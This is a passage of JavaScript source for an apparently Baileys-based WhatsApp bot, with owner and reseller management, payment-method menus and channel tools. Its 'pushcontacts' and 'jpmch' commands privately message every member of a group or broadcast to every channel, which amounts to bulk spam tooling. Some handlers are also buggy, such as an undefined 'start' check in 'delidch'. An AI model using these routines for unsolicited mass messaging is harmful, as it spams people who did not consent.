          await owners.splice(posi, 1);
          await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));
          xreply(`success delete owner ✅`);
        }
        break;
      case "addowner":
      case "addown":
        {
          if (!isOwner) return reply(mess.owner);
          if (!m.quoted && !text) return xreply(example("628xxx"));
          const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const input2 = input.split("@")[0];
          if (input2 === global.owner || owners.includes(input) || input === botNumber) return xreply(`number ${input2} already become owner bot!`);
          owners.push(input);
          await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));
          xreply(`success add owner ✅`);
        }
        break;

      /// ───────────── [ 𝖯𝖺𝗒𝗆𝖾𝗇𝗍 ] ──────────── ///
      case "pay":
        {
          const teks = `‼️\`Method Payment\``;
          const deks = `*𝖯𝗂𝖼𝗄 𝗈𝗇𝖾 𝗈𝖿 𝗍𝗁𝖾 𝗉𝖺𝗒𝗆𝖾𝗇𝗍 𝗆𝖾𝗍𝗁𝗈𝖽𝗌 𝖻𝖾𝗅𝗈𝗐. 𝖣𝗈𝗎𝖻𝗅𝖾-𝖼𝗁𝖾𝖼𝗄 𝗍𝗁𝖾 𝖺𝗆𝗈𝗎𝗇𝗍 𝖺𝗇𝖽 𝗍𝗁𝖾 𝖽𝖾𝗌𝗍𝗂𝗇𝖺𝗍𝗂𝗈𝗇 𝖻𝖾𝖿𝗈𝗋𝖾 𝗒𝗈𝗎 𝗌𝖾𝗇𝖽 𝖺𝗇𝗒𝗍𝗁𝗂𝗇𝗀.*

*🔔 𝖤-𝖶𝖺𝗅𝗅𝖾𝗍:*
└╼ 𝖣𝖺𝗇𝖺
└╼ 𝖮𝗏𝗈
└╼ 𝖦𝗈𝖯𝖺𝗒
`;
          const buttonMsg = generateWAMessageFromContent(m.chat, {
            buttonsMessage: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: `${global.botname}`,
                address: "Payment",
                jpegThumbnail: pay
              },
              contentText: teks,
              footerText: deks,
              buttons: [{
                buttonId: "menu",
                buttonText: {
                  displayText: "💳 choose method payment"
                },
                nativeFlowInfo: {
                  name: "single_select",
                  paramsJson: JSON.stringify({
                    title: "client Payment",
                    sections: [{
                      title: "choose method payment",
                      highlight_label: "〽️",
                      rows: [{
                        header: "",
                        title: "Qris",
                        description: `${global.namaqris}`,
                        id: ".qris"
                      }, {
                        header: "",
                        title: "Dana",
                        description: `${global.dana}`,
                        id: ".dana"
                      }, {
                        header: "",
                        title: "Gopay",
                        description: `${global.gopay}`,
                        id: ".gopay"
                      }, {
                        header: "",
                        title: "Ovo",
                        description: `${global.ovo}`,
                        id: ".ovo"
                      }, {
                        title: "Shoopepay",
                        description: `${global.shoopepay}`,
                        id: ".shoopepay"
                      }]
                    }]
                  })
                },
                type: 1
              }],
              headerType: 6
            }
          }, {
            userJid: client.user.id,
            quoted: m,
            messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
          });
          await client.relayMessage(m.chat, buttonMsg.message, {
            messageId: buttonMsg.key.id,
            additionalNodes: [{
              tag: "biz",
              attrs: {},
              content: [{
                tag: "interactive",
                attrs: {
                  type: "native_flow",
                  v: "1"
                },
                content: [{
                  tag: "native_flow",
                  attrs: {
                    v: "9",
                    name: "mixed"
                  },
                  content: []
                }]
              }]
            }]
          });
        }
        break;
      case "dana":
        {
          const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")].find(d => fs.existsSync(d));
          const file = dir && fs.readdirSync(dir).find(f => /^dana\.(jpe?g|png|webp)$/i.test(f));
          const paymentImage = file ? path.join(dir, file) : null;
          if (!paymentImage) return xreply("image dana not found in folder media/payment");
          const teks = `
*PAYMENT DANA*

*Number :* ${global.dana}
*Account name:* ${global.andana}

*[! ] Important:* you must send the transfer receipt for everyone's safety.
`;
          const imgsc = await prepareWAMessageMedia({
            image: {
              url: paymentImage
            }
          }, {
            upload: client.waUploadToServer
          });
          const interactive = {
            header: {
              title: "",
              hasMediaAttachment: true,
              imageMessage: imgsc.imageMessage
            },
            body: {
              text: teks
            },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "copy dana",
                  id: "copy_dana",
                  copy_code: String(global.dana)
                })
              }]
            }
          };
          const buttonMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
              }
            }
          }, {
            userJid: client.user.id,
            quoted: m,
            messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
          });
          let additionalNodes = [{
            tag: "biz",
            attrs: {},
            content: [{
              tag: "interactive",
              attrs: {
                type: "native_flow",
                v: "1"
              },
              content: [{
                tag: "native_flow",
                attrs: {
                  v: "9",
                  name: "mixed"
                },
                content: []
              }]
            }]
          }];
          await client.relayMessage(m.chat, buttonMsg.message, {
            messageId: buttonMsg.key.id,
            additionalNodes: additionalNodes
          });
        }
        break;
      case "ovo":
        {
          const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")].find(d => fs.existsSync(d));
          const file = dir && fs.readdirSync(dir).find(f => /^ovo\.(jpe?g|png|webp)$/i.test(f));
          const paymentImage = file ? path.join(dir, file) : null;
          if (!paymentImage) return xreply("image ovo not found in folder media/payment");
          const teks = `
*PAYMENT OVO*

*Number :* ${global.ovo}
*Account name:* ${global.anovo}

*[! ] Important:* you must send the transfer receipt for everyone's safety.
`;
          const imgsc = await prepareWAMessageMedia({
            image: {
              url: paymentImage
            }
          }, {
            upload: client.waUploadToServer
          });
          const interactive = {
            header: {
              title: "",
              hasMediaAttachment: true,
              imageMessage: imgsc.imageMessage
            },
            body: {
              text: teks
            },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "copy ovo",
                  id: "copy_ovo",
                  copy_code: String(global.ovo)
                })
              }]
            }
          };
          const buttonMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
              }
            }
          }, {
            userJid: client.user.id,
            quoted: m,
            messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
          });
          let additionalNodes = [{
            tag: "biz",
            attrs: {},
            content: [{
              tag: "interactive",
              attrs: {
                type: "native_flow",
                v: "1"
              },
              content: [{
                tag: "native_flow",
                attrs: {
                  v: "9",
                  name: "mixed"
                },
                content: []
              }]
            }]
          }];
          await client.relayMessage(m.chat, buttonMsg.message, {
            messageId: buttonMsg.key.id,
            additionalNodes: additionalNodes
          });
        }
        break;
      case "gopay":
        {
          const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")].find(d => fs.existsSync(d));
          const file = dir && fs.readdirSync(dir).find(f => /^gopay\.(jpe?g|png|webp)$/i.test(f));
          const paymentImage = file ? path.join(dir, file) : null;
          if (!paymentImage) return xreply("image gopay not found in folder media/payment");
          const teks = `
*PAYMENT GOPAY*

*Number :* ${global.gopay}
*Account name:* ${global.angopay}

*[! ] Important:* you must send the transfer receipt for everyone's safety.
`;
          const imgsc = await prepareWAMessageMedia({
            image: {
              url: paymentImage
            }
          }, {
            upload: client.waUploadToServer
          });
          const interactive = {
            header: {
              title: "",
              hasMediaAttachment: true,
              imageMessage: imgsc.imageMessage
            },
            body: {
              text: teks
            },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "copy gopay",
                  id: "copy_gopay",
                  copy_code: String(global.gopay)
                })
              }]
            }
          };
          const buttonMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
              }
            }
          }, {
            userJid: client.user.id,
            quoted: m,
            messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
          });
          let additionalNodes = [{
            tag: "biz",
            attrs: {},
            content: [{
              tag: "interactive",
              attrs: {
                type: "native_flow",
                v: "1"
              },
              content: [{
                tag: "native_flow",
                attrs: {
                  v: "9",
                  name: "mixed"
                },
                content: []
              }]
            }]
          }];
          await client.relayMessage(m.chat, buttonMsg.message, {
            messageId: buttonMsg.key.id,
            additionalNodes: additionalNodes
          });
        }
        break;
      case "shoopepay":
      case "shopepay":
        {
          const dir = [path.join(process.cwd(), "media", "payment"), path.join(__dirname, "media", "payment")].find(d => fs.existsSync(d));
          const file = dir && fs.readdirSync(dir).find(f => /^(shoopepay|shopepay)\.(jpe?g|png|webp)$/i.test(f));
          const paymentImage = file ? path.join(dir, file) : null;
          if (!paymentImage) return xreply("ShopeePay image not found in media/payment (file name: shoopepay.jpg)");
          const teks = `
*PAYMENT SHOPEEPAY*

*Number :* ${global.shoopepay}
*Account name:* ${global.anshoope}

*[! ] Important:* you must send the transfer receipt for everyone's safety.
`;
          const imgsc = await prepareWAMessageMedia({
            image: {
              url: paymentImage
            }
          }, {
            upload: client.waUploadToServer
          });
          const interactive = {
            header: {
              title: "",
              hasMediaAttachment: true,
              imageMessage: imgsc.imageMessage
            },
            body: {
              text: teks
            },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "copy shopeepay",
                  id: "copy_shoopepay",
                  copy_code: String(global.shoopepay)
                })
              }]
            }
          };
          const buttonMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
              }
            }
          }, {
            userJid: client.user.id,
            quoted: m,
            messageId: Math.random().toString(36).substring(2, 15).toUpperCase()
          });
          let additionalNodes = [{
            tag: "biz",
            attrs: {},
            content: [{
              tag: "interactive",
              attrs: {
                type: "native_flow",
                v: "1"
              },
              content: [{
                tag: "native_flow",
                attrs: {
                  v: "9",
                  name: "mixed"
                },
                content: []
              }]
            }]
          }];
          await client.relayMessage(m.chat, buttonMsg.message, {
            messageId: buttonMsg.key.id,
            additionalNodes: additionalNodes
          });
        }
        break;
      case "qris":
        {
          const paymentImage = path.join(__dirname, "media", "payment", "qris.jpg");
          const teks = `*⁉️ 𝖭𝖮𝖳𝖤:* 𝖸𝗈𝗎 𝗆𝗎𝗌𝗍 𝗌𝖾𝗇𝖽 𝗍𝗁𝖾 𝗍𝗋𝖺𝗇𝗌𝖿𝖾𝗋 𝗋𝖾𝖼𝖾𝗂𝗉𝗍 𝖿𝗈𝗋 𝖾𝗏𝖾𝗋𝗒𝗈𝗇𝖾'𝗌 𝗌𝖺𝖿𝖾𝗍𝗒.`;
          if (!fs.existsSync(paymentImage)) return xreply("error in case qris");
          await client.sendMessage(m.chat, {
            image: fs.readFileSync(paymentImage),
            caption: teks
          }, {
            quoted: qpayment
          });
        }
        break;
      case "ambilq":
      case "q":
        {
          if (!m.quoted) return;
          let jsonData = JSON.stringify(m.quoted, null, 2);
          xreply(jsonData);
        }
        break;
      case "proses":
        {
          if (!isOwner) return reply(mess.owner);
          if (!q) return xreply(example("jasa install panel"));
          let teks = `📦 ${text}
⏰ ${new Date().toLocaleString('en-GB')}`;
          await client.sendMessage(m.chat, {
            text: teks,
            mentions: [m.sender],
            contextInfo: {
              externalAdReply: {
                title: `payment received ✅`,
                body: `© Powered By ${namaOwner}`,
                thumbnail: thumb,
                sourceUrl: `${global.source}`
              }
            }
          }, {
            quoted: null
          });
        }
        break;
      case "done":
        {
          if (!isOwner) return reply(mess.owner);
          if (!q) return xreply(example("jasa install panel"));
          let teks = `📦 ${text}
⏰ ${new Date().toLocaleString('en-GB')}`;
          await client.sendMessage(m.chat, {
            text: teks,
            mentions: [m.sender],
            contextInfo: {
              externalAdReply: {
                title: `Transaksi Done ✅`,
                body: `© Powered By ${namaOwner}`,
                thumbnail: thumb,
                sourceUrl: `${global.source}`
              }
            }
          }, {
            quoted: null
          });
        }
        break;

      /// ───────────── [ 𝖬𝖾𝗇𝗎 𝖯𝖺𝗇𝖾𝗅 𝖱𝖺𝗆 ] ──────────── ///
      case "listseller":
        {
          if (premium.length < 1) return xreply("no user reseller");
          let teks = `\n *乂 List all reseller panel*\n`;
          for (let i of premium) {
            teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`;
          }
          client.sendMessage(m.chat, {
            text: teks,
            mentions: premium
          }, {
            quoted: m
          });
        }
        break;
      case "delseller":
        {
          if (!isOwner) return xreply(mess.owner);
          if (!m.quoted && !text) return xreply(example("6285###"));
          const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const input2 = input.split("@")[0];
          if (input2 == global.owner || input == botNumber) return xreply(`cannot delete the owner!`);
          if (!premium.includes(input)) return xreply(`number ${input2} not a reseller!`);
          let posi = premium.indexOf(input);
          await premium.splice(posi, 1);
          await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
          xreply(`success delete reseller ✅`);
        }
        break;
      case "babu":
        {
          if (!isOwner) return xreply(mess.owner);
          if (!text && !m.quoted) return xreply(example("6285###"));
          const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const input2 = input.split("@")[0];
          if (input2 === global.owner || premium.includes(input) || input === botNumber) return xreply(`number ${input2} is already a reseller!`);
          premium.push(input);
          await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
          xreply(`success add User kacung jadi Prem ✅`);
        }
        break;

      /// ───────────── [ 𝖫𝗂𝗌𝗍 𝖠𝖽𝗆𝗂𝗇 & 𝖯𝖺𝗇𝖾𝗅 ] ──────────── ///
      case "pushcontacts2":
        {
          if (!isOwner) return xreply(mess.owner);
          if (!m.isGroup) return xreply(mess.group);
          if (!text) return xreply(example("pesannya"));
          const teks = text;
          const jidawal = m.chat;
          const data = await client.groupMetadata(m.chat);
          const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          await xreply(`Processing pushcontacts to *${halls.length}* member group`);
          for (let mem of halls) {
            if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
              await client.sendMessage(mem, {
                text: teks
              }, {
                quoted: qlocPush
              });
              await sleep(global.delayPushcontacts);
            }
          }
          await client.sendMessage(jidawal, {
            text: `*pushcontact successful ✅*
total members the message was sent to: ${halls.length}`
          }, {
            quoted: m
          });
        }
        break;
      case "respushcontacts":
        {
          if (!isOwner) return;
          if (!text) return;
          if (!global.textpushcontacts) return;
          const idgc = text;
          const teks = global.textpushcontacts;
          const jidawal = m.chat;
          const data = await client.groupMetadata(idgc);
          const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          await xreply(`processing *pushcontacts* to in group *${data.subject}*`);
          for (let mem of halls) {
            if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
              await client.sendMessage(mem, {
                text: teks
              }, {
                quoted: qlocPush
              });
              await sleep(global.delayPushcontacts);
            }
          }
          delete global.textpushcontacts;
          await client.sendMessage(jidawal, {
            text: `*pushcontact successful ✅*
total members the message was sent to: ${halls.length}`
          }, {
            quoted: m
          });
        }
        break;
      case "pushcontacts":
        {
          if (!isOwner) return xreply(mess.owner);
          if (!text) return xreply(example("pesannya"));
          const meta = await client.groupFetchAllParticipating();
          let dom = await Object.keys(meta);
          global.textpushcontacts = text;
          let list = [];
          for (let i of dom) {
            await list.push({
              title: meta[i].subject,
              id: `.respushcontacts ${i}`,
              description: `${meta[i].participants.length} Member`
            });
          }
          return client.sendMessage(m.chat, {
            buttons: [{
              buttonId: 'action',
              buttonText: {
                displayText: " message interactiveMeta"
              },
              type: 4,
              nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                  title: "choose group",
                  sections: [{
                    title: "List group Chat",
                    rows: [...list]
                  }]
                })
              }
            }],
            footer: `© ${global.botname} • 2026`,
            headerType: 1,
            viewOnce: true,
            text: "choose Target group Pushcontacts\n",
            contextInfo: {
              isForwarded: true,
              mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            }
          }, {
            quoted: m
          });
        }
        break;
      case "joingb":
      case "join":
        {
          if (!isOwner) return xreply(mess.owner);
          if (!text) return xreply(example("linkgcnya"));
          if (!text.includes("chat.whatsapp.com")) return xreply("invalid link");
          let result = text.split('https://chat.whatsapp.com/')[1];
          let id = await client.groupAcceptInvite(result);
          xreply(`success bergabung to in group ${id}`);
        }
        break;

      /// ───────────── [ 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 𝖴𝗉𝗅𝗈𝖺𝖽 ] ──────────── ///
      case 'upch':
      case 'upchannel':
      case 'sendch':
        {
          if (!isOwner) return xreply(mess.owner);
          const clientsender = m.key.remoteJid;
          const name = client.getName ? await client.getName(clientsender) : "you";
          const targetChannel = targetChannelData.id;
          if (!text && !(quoted && quoted.message)) {
            return xreply(`usage *${prefix}upch*:\n\n` + `1. reply to a media (photo/video/sticker/audio/document) + type *${prefix}upch* to send media to the channel.

` + `*Note:*\n` + `before using this, make sure the target channel is already set with the command *${prefix}setch 120xxxx@newsletter*\n\n` + `> Akoya-MD`);
          }
          client.sendMessage(m.chat, {
            react: {
              text: '⏳',
              key: m.key
            }
          });
          const contentText = text?.trim();
          const ppuser = await getBuffer(await client.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/8534/638498350_rafaofficial.jpg'));
          const ctx = {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: targetChannel,
              serverMessageId: 20,
              newsletterName: `${global.namaSaluran}`
            },
            externalAdReply: {
              title: `⭐ message from ${name}`,
              body: `Runtime: ${runtime(process.uptime())} ⚙️`,
              thumbnail: ppuser,
              mediaType: 1,
              sourceUrl: `${global.source}`
            }
          };
          const isQuoted = quoted && quoted.message;
          if (isQuoted) {
            const type = Object.keys(quoted.message)[0];
            const media = await client.downloadAndSaveMediaMessage(quoted);
            const fileName = quoted?.fileName || 'File.unknown';
            switch (type) {
              case 'imageMessage':
                await client.sendMessage(targetChannel, {
                  image: {
                    url: media
                  },
                  caption: contentText || '',
                  contextInfo: ctx
                });
                break;
              case 'videoMessage':
                await client.sendMessage(targetChannel, {
                  video: {
                    url: media
                  },
                  caption: contentText || '',
                  contextInfo: ctx
                });
                break;
              case 'audioMessage':
                await client.sendMessage(targetChannel, {
                  audio: {
                    url: media
                  },
                  mimetype: 'audio/mp4',
                  ptt: quoted.message.audioMessage?.ptt || false,
                  contextInfo: ctx
                });
                break;
              case 'stickerMessage':
                await client.sendMessage(targetChannel, {
                  sticker: {
                    url: media
                  },
                  contextInfo: ctx
                });
                break;
              case 'documentMessage':
                await client.sendMessage(targetChannel, {
                  document: {
                    url: media
                  },
                  mimetype: quoted.mimetype || 'application/octet-stream',
                  fileName: fileName,
                  contextInfo: ctx
                });
                break;
              default:
                await client.sendMessage(targetChannel, {
                  document: {
                    url: media
                  },
                  mimetype: 'application/octet-stream',
                  fileName: fileName,
                  contextInfo: ctx
                });
                break;
            }
          } else if (contentText) {
            await client.sendMessage(targetChannel, {
              text: contentText,
              contextInfo: ctx
            });
          }
          client.sendMessage(m.chat, {
            react: {
              text: '✅',
              key: m.key
            }
          });
        }
        break;
      case "jpmch":
        {
          if (!isOwner) return xreply(mess.owner);
          if (!text && !m.quoted) return xreply(example("The text or reply text"));
          var teks = m.quoted ? m.quoted.text : text;
          let total = 0;
          global.channels ??= loadChannels();
          if (global.channels.length === 0) return xreply(`
╔══════════════════════════╗ 
 ❌ *ERROR* ❌ 
╚══════════════════════════╝ 
⚠️ no channel registered for *JPM*! 
please register channel first. 
`);
          xreply(`
╭─❰ *PROCESSING MESSAGE* ❱─╮ 
📮 *Mengirim message Ke*: 
 ➥ *${global.channels.length} Channel* 
⏳ *please wait...* 
╰─────────────────────╯ 
 `);
          for (let id of global.channels) {
            try {
              await client.sendMessage(id, {
                text: teks
              }, {
                quoted: qloc
              });
              total += 1;
            } catch (e) {
              console.log(`⚠️ failed to send to ${id}:`, e);
            }
            await sleep(global.delayJpm);
          }
          xreply(`
╭─❰ *𝖲𝖤𝖭𝖳* ❱
└▢ *𝖬𝖾𝗌𝗌𝖺𝗀𝖾 𝗌𝖾𝗇𝗍*: 
└▢ *${total} 𝖢𝗁𝖺𝗇𝗇𝖾𝗅* 
└▢ *𝖲𝗍𝖺𝗍𝗎𝗌*: 𝗌𝗎𝖼𝖼𝖾𝗌𝗌! 
└▢ *𝖣𝖾𝗅𝖺𝗒: ${global.cooldown}*
 `);
        }
        break;
      case "jpmch2":
        {
          if (!isOwner) return xreply(mess.owner);
          const qmsg = m.quoted ? m.quoted : m;
          let teks = (text || "").trim();
          let mediaBuffer = null;
          let mediaType = null;
          if (!teks && m.quoted) {
            teks = qmsg.text || qmsg.body || qmsg.contentText || "";
          }
          if (!teks && !m.quoted) {
            return xreply(example("The text or reply text/media"));
          }
          if (m.quoted) {
            try {
              const quotedMime = qmsg.mimetype || "";
              if (qmsg.isImage || /^image\//i.test(quotedMime)) {
                mediaBuffer = await qmsg.download();
                mediaType = "image";
              } else if (qmsg.isVideo || /^video\//i.test(quotedMime)) {
                mediaBuffer = await qmsg.download();
                mediaType = "video";
              } else if (qmsg.isAudio || /^audio\//i.test(quotedMime)) {
                mediaBuffer = await qmsg.download();
                mediaType = "audio";
              }
            } catch (err) {
              console.log("[JPMCH2] Media download failed:", err?.message);
            }
          }
          const fetchSubscribedChannels = async sock => {
            const data = {};
            const encoder = new TextEncoder();
            const queryIds = ["6388546374527196"];
            for (const queryId of queryIds) {
              try {
                if (typeof sock.query !== "function") {
                  throw new Error("sock.query unavailable");
                }
                const result = await sock.query({
                  tag: "iq",
                  attrs: {
                    id: sock.generateMessageTag(),
                    type: "get",
                    xmlns: "w:mex",
                    to: "@s.whatsapp.net"
                  },
                  content: [{
                    tag: "query",
                    attrs: {
                      query_id: queryId
                    },
                    content: encoder.encode(JSON.stringify({
                      variables: {}
                    }))
                  }]
                });
                const resultNode = getBinaryNodeChildren(result, "result")[0];
                if (!resultNode?.content) continue;
                const parsed = JSON.parse(resultNode.content.toString());
                const newsletters = parsed?.data?.["xwa2_newsletter_subscribed"] || parsed?.data?.["newsletter_subscribed"] || parsed?.data?.["subscribed"] || [];
                if (newsletters.length > 0) {
                  for (const ch of newsletters) {
                    if (!ch.id) continue;
                    data[ch.id] = {
                      id: ch.id,
                      name: ch.thread_metadata?.name?.text || ch.name || "Unknown",
                      subscribers: ch.thread_metadata?.subscribers_count || 0
                    };
                  }
                  break;
                }
              } catch (err) {
                console.log(`[JPMCH2] Query ${queryId} failed:`, err?.message);
              }
            }
            return data;
          };
          await client.sendMessage(m.chat, {
            react: {
              text: "📢",
              key: m.key
            }
          });
          try {
            let channels = await fetchSubscribedChannels(client);
            let channelIds = Object.keys(channels);
            if (channelIds.length === 0) {
              global.channels ??= loadChannels();
              if (Array.isArray(global.channels) && global.channels.length > 0) {
                for (const id of global.channels) {
                  channels[id] = {
                    id,
                    name: "Saved Channel",
                    subscribers: 0
                  };
                }
                channelIds = Object.keys(channels);
              }
            }
            if (channelIds.length === 0) {
              await client.sendMessage(m.chat, {
                react: {
                  text: "❌",
                  key: m.key
                }
              });
              return xreply(`❌ *No channels found*\n\n` + `> The bot is not subscribed to any channel yet.
` + `> Add one manually with *.addidch <link>* first.`);
            }
            const jedaJpm = Number(global.delayJpm) || 5000;
            const ctx = {
              isForwarded: true,
              forwardingScore: 999,
              ...(global.newsletterInfo ? { forwardedNewsletterMessageInfo: { ...global.newsletterInfo, serverMessageId: 127 } } : {})
            };
            const preview = teks ? teks.substring(0, 60) + (teks.length > 60 ? "..." : "") : "no";
            await xreply(`
 ❰ *𝖲𝖤𝖭𝖣𝖨𝖭𝖦* ❱
> 📝 𝗆𝖾𝗌𝗌𝖺𝗀𝖾: *${preview}*
> 📷 𝖬𝖾𝖽𝗂𝖺   : *${mediaBuffer ? mediaType : "no"}*
> 📺 𝖳𝖺𝗋𝗀𝖾𝗍  : *${channelIds.length}* 𝖼𝗁𝖺𝗇𝗇𝖾𝗅
_𝖢𝗎𝗋𝗋𝖾𝗇𝗍𝗅𝗒 𝗌𝖾𝗇𝖽𝗂𝗇𝗀 𝗍𝗈 𝖺𝗅𝗅 𝖼𝗁𝖺𝗇𝗇𝖾𝗅_`);
            let xsaluran = 0;
            let xfailed = 0;
            const failedChannels = [];
            for (const chId of channelIds) {
              if (global.stopjpm) {
                delete global.stopjpm;
                await client.sendMessage(m.chat, {
                  react: {
                    text: "⏹️",
                    key: m.key
                  }
                });
                return xreply(`
 ❰ *STOPPED SEND* ❱
> ▢ success: *${xsaluran}*
> ▢ failed: *${xfailed}*
> ▢ Remaining: *${channelIds.length - xsaluran - xfailed}*`);
              }
              try {
                const payload = mediaBuffer ? {
                  [mediaType]: mediaBuffer,
                  caption: teks,
                  contextInfo: ctx
                } : {
                  text: teks,
                  contextInfo: ctx
                };
                await client.sendMessage(chId, payload);
                xsaluran++;
              } catch (err) {
                xfailed++;
                failedChannels.push(channels[chId]?.name || chId);
                console.log(`[JPMCH2] Failed ${chId}:`, err?.message);
              }
              await sleep(jedaJpm);
            }
            await client.sendMessage(m.chat, {
              react: {
                text: "✅",
                key: m.key
              }
            });
            let xmsg = `╭─❰ *𝖲𝖤𝖭𝖳* ❱
└▢ *𝖬𝖾𝗌𝗌𝖺𝗀𝖾: 𝗌𝖾𝗇𝗍*: 
└▢ *${xsaluran} 𝖢𝗁𝖺𝗇𝗇𝖾𝗅* 
└▢ *𝖲𝗍𝖺𝗍𝗎𝗌: 𝗌𝗎𝖼𝖼𝖾𝗌𝗌! 
└▢ *𝖢𝗋𝖾𝖺𝗍𝗈𝗋: 𝗆𝗈𝗈𝗇𝗌𝗈𝗇*`;
            if (failedChannels.length > 0) {
              xmsg += ` └▢ *Channel failed:*
` + failedChannels.map((n, i) => `> ${i + 1}. ${n}`).join("\n");
            }
            await xreply(xmsg);
          } catch (error) {
            console.error("[JPMCH2 ERROR]", error);
            await client.sendMessage(m.chat, {
              react: {
                text: "❌",
                key: m.key
              }
            });
            return xreply(`❌ *JPMCH2 Error*\n\n` + `${error?.message || error}`);
          }
        }
        break;
      case "delidch":
        {
          if (!isOwner) return reply(mess.owner);
          if (!text) return reply("Enter the channel number or ID you want to delete.");
          global.channels ??= loadChannels();
          if (!isNaN(text)) {
            let index = parseInt(text.trim()) - 1;
            if (start < 0 || start >= global.channels.length) {
              return xreply("number urut invalid!");
            }
            let removed = global.channels.splice(index, 1);
            saveChannels(global.channels);
            xreply(`successfully deleted the channel ID: *${removed[0]}*`);
          } else {
            let channelId = text.trim();
            if (!global.channels.includes(channelId)) {
              return reply("ID Channel not found!");
            }
            global.channels = global.channels.filter(id => id !== channelId);
            saveChannels(global.channels);
            Reply(`successfully deleted the channel ID: *${channelId}*`);
          }
        }
        break;
      case "addidch":
        {
          if (!isOwner) return xreply(!isOwner);
          if (!text) return reply("Harap enter link channel!");
          let channelLink = text.trim();
          if (!channelLink.includes("https://whatsapp.com/channel/")) {
            return xreply("link saluran invalid! must berupa link WhatsApp (https://whatsapp.com/channel/...)");
          }
          let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
          if (!channelId) return xreply("failed mengekstrak ID from link channel!");
          try {
            let res = await client.newsletterMetadata("invite", channelId);
            if (!res.id) return reply("ID channel invalid!");
            global.channels ??= loadChannels();
            if (global.channels.includes(res.id)) {
              return xreply(`ID Channel *${res.id}* already registered!`);
            }
            global.channels.push(res.id);
            saveChannels(global.channels);
            Reply(`success adding ID Channel *${res.id}* from link:
${channelLink}

name Channel: ${res.name}`);
          } catch (e) {
            console.error(e);
            Reply("an error occurred during processing link channel. Make sure link valid!");
          }
        }
        break;
      case "cekidch":
      case "idch":
        {
          if (!text) return reply(example("linkchnya 🤨"));
          if (!text.includes("https://whatsapp.com/channel/")) return reply("invalid link");
          let kode = text.split("https://whatsapp.com/channel/")[1].split(/[/?\s]/)[0];
          let res = await client.newsletterMetadata("invite", kode).catch(() => null);
          if (!res) return reply("channel not found");
          let th = res.thread_metadata || {};
          let nama = res.name?.text || res.name || th.name?.text || "-";
          let pengikut = res.subscribers || th.subscribers_count || "-";
          let status = res.state?.type || res.state || th.state?.type || "-";
          let verif = (res.verification || th.verification) == "VERIFIED" ? "Terverifikasi" : "No";
          let teks = `
* *ID :* ${res.id}
* *Name :* ${nama}
* *Followers:* ${pengikut}
* *Status :* ${status}
* *Verified :* ${verif}`;
          let msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: {
                    text: teks
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Copy ID Channel",
                        id: "copy_id",
                        copy_code: res.id
                      })
                    }]
                  }
                })
              }
            }
          }, {
            userJid: client.user.id,
            quoted: m
          });
          await client.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id,
            additionalNodes: [{
              tag: "biz",
              attrs: {},
              content: [{
                tag: "interactive",
                attrs: {
                  type: "native_flow",
                  v: "1"
                },
                content: [{
                  tag: "native_flow",
                  attrs: {
                    v: "9",
                    name: "mixed"
                  },
